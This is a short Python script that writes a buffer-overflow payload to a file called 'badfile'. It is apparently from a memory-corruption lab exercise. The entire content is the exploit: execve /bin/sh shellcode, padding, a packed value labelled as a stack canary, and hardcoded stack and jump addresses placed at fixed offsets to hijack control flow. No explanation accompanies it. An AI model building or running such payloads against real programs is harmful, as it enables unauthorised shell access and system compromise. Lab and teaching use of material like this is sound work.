import struct 

# PAYLOAD
# [shellcode][AA..AAA][canary][BB..BBB][dst][CC..CCC][dsc]

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
dsc = 0x804852b
x = 1111638594 
dst = 0xbffff134 

payload = shellcode
payload += "A"*(120-len(payload))
payload += struct.pack("I",x)
#payload += "BBBBCCCCDDDDEEEEFFFF"
payload += "BBBBCCCCDDDD"
payload += struct.pack("I",dst)
payload += "Z"*(270-len(payload))
payload += struct.pack("I",dsc)

f = open("badfile","w")
f.write(payload)
f.close()

